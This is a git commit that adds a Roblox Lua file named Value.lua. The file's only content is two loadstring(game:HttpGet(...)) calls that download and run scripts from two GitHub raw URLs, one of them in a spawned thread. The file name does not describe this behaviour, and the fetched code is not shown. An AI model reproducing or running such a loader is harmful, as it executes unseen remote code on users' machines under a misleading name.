12c412efb0e5d92d352eb925a9cb7262a0bade43
wixboops <coke3@dr.com>
2025-06-17 11:47:27 -0500

    Create Value.lua

---
+++ Value.lua
@@ -0,0 +1,5 @@
+spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/greywaterstill/GAG/refs/heads/main/GAG.lua"))();
+end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/Chair2/refs/heads/main/Red"))()
